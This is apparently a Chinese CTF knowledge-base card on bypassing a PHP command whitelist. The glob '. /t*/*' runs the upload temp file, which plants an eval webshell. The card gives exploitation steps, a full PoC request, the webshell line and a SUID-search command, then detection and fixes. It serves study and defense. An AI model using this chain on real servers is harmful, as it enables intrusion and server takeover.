---
id: web-php-rce-regex-whitelist-glob-tmp-upload-exec
title: PHP 命令白名单 ^[./*t ]+$ 绕过：`. /t*/*` glob 展开执行 /tmp 上传临时文件并落地 webshell
type: scenario
domain: web
path: web/php/rce
technique: php-regex-whitelist-glob-tmp-upload-exec
tags:
- php
- rce
- command-injection
- whitelist-bypass
- glob
- file-upload
- temp-file
- webshell
- ctf
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V275
  verified_at: '2026-11-07T23:17:30+08:00'
  notes: 已对照原文核对：upload.php 的 preg_match('/^[\.\/\*t ]+$/',cmd) 白名单与 shell_exec、同请求 file+cmd、图05/06 fuzz 可用字符、图07 payload '. /t*/*' 与 upload error 后 <pre></pre> 回显一致；. 为 shell 内建 source、/t*/* glob 展开到 /tmp/phpXXXX 上传临时文件、同请求结束才删除的机制成立；写 webshell 的 1.sh 内容与 source 执行一致。未验证点：未复跑环境；蚁剑连接与 SUID 提权原文仅一句、无完整命令/flag 截图（confidence medium 已如实标注）；X-Powered-By PHP/7.4.33 为靶场环境非受影响版本；frontmatter 无 sources/source_url。
url: /docs/web/php/rce/web-php-rce-regex-whitelist-glob-tmp-upload-exec/
draft: false
kb_aliases:
- . /t*/* 绕过
- PHP 正则白名单 glob
- 上传临时文件执行
- /tmp/php 临时文件
- admin_Test
- 无字母命令执行
---

## 一句话结论

`upload.php` 的 `cmd` 参数被 `preg_match('/^[\.\/\*t ]+$/', $cmd)` 限制为只含 `.`、`/`、`*`、`t`、空格，随后交给 `shell_exec`；攻击者利用 shell 的路径名展开，把 payload 写成 `. /t*/*`，shell 会把它展开为 `. /tmp/<PHP 上传临时文件>`，也就是用 `.`（source）执行当前请求中 PHP 上传产生的 `/tmp/phpXXXX` 临时文件。上传文件内容为 `echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php`，临时文件执行后把 webshell 写入 webroot；随后蚁剑连接并 suid 提权。上传和 cmd 必须在同一个 POST 请求中，因为 PHP 会在请求结束时删除临时文件。

## 原理

- **白名单只允许 glob 字符**：正则 `^[\.\/\*t ]+$` 允许的字符是 `.`、`/`、`*`、`t`、空格；它没有禁止 `/`、`*`，也没有限制参数数量，因此攻击者可以构造 `. /t*/*`。
- **shell 路径名展开**：`/t*/*` 由 `/bin/sh` 进行 glob 展开，`/t*` 匹配 `/tmp`，`/*` 匹配 `/tmp` 下的所有条目；PHP 文件上传默认把临时文件放在 `/tmp/phpXXXXXX`，所以 `. /t*/*` 会展开为 `. /tmp/phpXXXXXX`（以及可能存在的其他临时文件），`.` 是 shell 内建命令，读取并执行该文件中的命令。
- **为什么临时文件可执行**：`move_uploaded_file` 失败/未执行时，PHP 上传的临时文件仍在 `/tmp`（请求结束时才删除）；`cmd` 的处理与 `$_FILES` 在同一个 POST 请求中，`shell_exec($cmd)` 执行时临时文件仍然存在。上传成功与否不影响临时文件存在；原文上传返回 `upload error, but you can try another way`，但 cmd 仍成功执行。
- **写 webshell**：`1.sh` 的内容是 `echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php`；`.` 执行该临时文件后，shell 的 echo + 重定向把 PHP webshell 写入 Web 根目录。随后攻击者用蚁剑连接 `1.php`，再通过 suid 提权。
- **为什么其他字符没用**：白名单不允许字母（除 `t`）、数字、`$`、`;`、`|`、`&`、引号等；但 `t` 允许出现在 glob 中（`/t*` 匹配 `/tmp`），`.` 允许 source，`/` 和 `*` 允许路径展开，空格允许分隔命令与参数；这四个字符足以完成“执行 /tmp 下任意上传文件”。
- **利用成立的关键**：PHP 上传临时目录可预测/可 glob，且 `shell_exec` 与上传处理在同一请求内；应用把“字符白名单”误当成“命令白名单”，没有限制 glob 展开和 source 内建命令。

## 触发条件

- PHP 应用存在文件上传 + 命令执行（`shell_exec`/`system`/`exec`/`popen`）组合，命令参数只做正则字符白名单，且允许 `.`、`/`、`*`、`t`、空格。
- PHP 上传临时目录为默认 `/tmp`（或可被 `/t*` 匹配），临时文件在请求结束前存在；`cmd` 与 `file` 可在同一个 POST 请求中提交。
- Web 根目录可写（或临时文件执行后能写入其他可访问路径）；`/bin/sh` 支持 glob 与 `.` 内建。
- 攻击者能上传一个内容为 shell 命令/写 webshell 的文件（文件名/扩展名不影响，因为执行的是临时文件）。

## 利用步骤

1. 信息收集：确认 upload.php 同时处理 `file` 与 `cmd`，`cmd` 经过 `preg_match('/^[\.\/\*t ]+$/', $cmd)`，失败返回 `Invalid char`，成功执行 `shell_exec`。
2. 构造上传文件（内容为写 webshell 的 shell 命令），例如 `1.sh`：
   ```sh
   echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php
   ```
3. 在同一个 multipart POST 中提交 `file=@1.sh` 与 `cmd=. /t*/*`；shell 将 `/t*/*` 展开为 `/tmp/phpXXXX`，`.` 执行临时文件，把 `1.php` 写入 webroot。
4. 访问 `/1.php`，用蚁剑/菜刀连接（密码参数 `1`），执行命令。
5. 在 webshell 中查找 suid 程序（`find / -perm -4000 -type f 2>/dev/null`）并提权，读取 flag。
6. 若 `/t*/*` 展开到多个文件导致报错，可尝试 `. /t*/php*` 等更精确的 glob；若临时目录不是 `/tmp`，用 `t` 与其他字符构造对应前缀，或改用 `*` 匹配。

## PoC

原文 multipart 请求（关键部分；`1.sh` 为上传文件）：

```http
POST /upload.php HTTP/1.1
Host: <target>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarySGSyzJLlJV1Wdik

------WebKitFormBoundarySGSyzJLlJV1Wdik
Content-Disposition: form-data; name="file"; filename="1.sh"
Content-Type: application/octet-stream

echo '<?php @eval($_POST[1]);?>' > /var/www/html/1.php
------WebKitFormBoundarySGSyzJLlJV1Wdik
Content-Disposition: form-data; name="cmd"

. /t*/*
------WebKitFormBoundarySGSyzJLlJV1Wdik--
```

```text
响应：upload error, but you can try another way<br><pre></pre>
（临时文件仍被执行，/var/www/html/1.php 已写入）
```

> 说明：原文通过 Burp 对 `cmd` 字符做 fuzz，确认 `.`、`/`、`*`、`t` 可用，最终 `. /t*/*` 成功执行上传临时文件并写入 webshell；后续蚁剑 + suid 提权未给出完整命令/flag 截图，confidence 标 medium，未在本机复跑。

## 变体与关联

- **glob/引号绕过**：[[web-php-rce-shell-exec-quote-concat-glob-flag]] 用 `c''at /f*` 绕过黑名单；本卡用字符白名单 + `/t*/*` glob 执行上传临时文件，绕过的对象与利用目标不同。
- **命令空格/长度限制**：[[web-php-rce-command-space-blacklist-tab-passthru]]、[[web-php-rce-four-char-command-length-bypass]] 覆盖空格/长度受限的命令构造；本卡是“只允许 glob 字符”的白名单。
- **上传临时文件**：PHP 上传临时文件在 `/tmp`、请求结束删除；同类思路可用于 LFI 临时文件包含、`/proc/self/fd` 等；本卡用 `.` source 执行。
- **SUID 提权**：蚁剑连接后按 `find / -perm -4000` 查 suid，参考 pentest/privilege-escalation 下的 SUID/GTFOBins 卡。
- 边界：临时目录不是 `/tmp`、`shell_exec` 被禁用、Web 根不可写、`cmd` 与 `file` 不在同一请求、或白名单不允许 `.`/`*`/`t` 时，本链失效。

## 检测与防御

- 修复：不要用 `shell_exec` 执行用户输入；命令参数使用固定命令 + 参数数组（`proc_open` 的 array 形式）而不是字符串；若必须限制，用完整命令白名单而非字符白名单，并禁止 glob/`.`/`*`。
- 加固：上传临时目录与 Web 根隔离，临时文件不可执行；Web 进程最小权限；禁用 `shell_exec`/`system`/`exec`/`popen` 或限制 `disable_functions`；对上传文件做内容/扩展名/大小校验。
- 检测：请求参数中出现 `. /t*/*`、`/t*`、`*` 等 glob 组合；`shell_exec` 执行 `/tmp/php*` 临时文件；上传请求同时带 `cmd`；Web 根出现新 PHP 文件；进程执行 `find -perm -4000`、蚁剑特征流量。
- 该场景为 CTF/授权测试；生产环境不能把字符白名单当作命令安全边界。
